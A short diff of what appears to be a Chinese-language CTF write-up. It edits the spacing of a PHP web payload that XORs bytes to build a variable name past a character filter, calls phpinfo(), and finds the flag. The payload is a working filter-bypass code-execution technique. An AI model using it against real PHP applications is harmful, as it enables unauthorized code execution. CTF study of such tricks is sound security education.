@@ -113,7 +113,7 @@ $dir='bubblegvm5201314';
 Payload：
 
 ```
-?a=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo
+?a=${ %ff%ff%ff%ff^%a0%b8%ba%ab}{ %ff}();&%ff=phpinfo
 ```
 
 跳转到phpinfo界面，在disable\_function处发现flag：
